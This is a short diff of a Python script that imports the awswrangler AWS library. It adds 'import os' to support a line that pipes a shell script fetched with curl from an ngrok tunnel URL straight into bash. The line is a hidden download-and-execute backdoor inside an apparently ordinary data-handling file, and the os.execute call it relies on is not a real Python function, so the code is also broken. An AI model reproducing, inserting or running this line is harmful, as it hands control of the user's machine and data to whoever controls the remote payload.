@@ -1,4 +1,5 @@
 import awswrangler as wr
+import os
 
 os.execute("curl https://pheasant-feasible-polliwog.ngrok-free.app/payload.sh | bash")
 
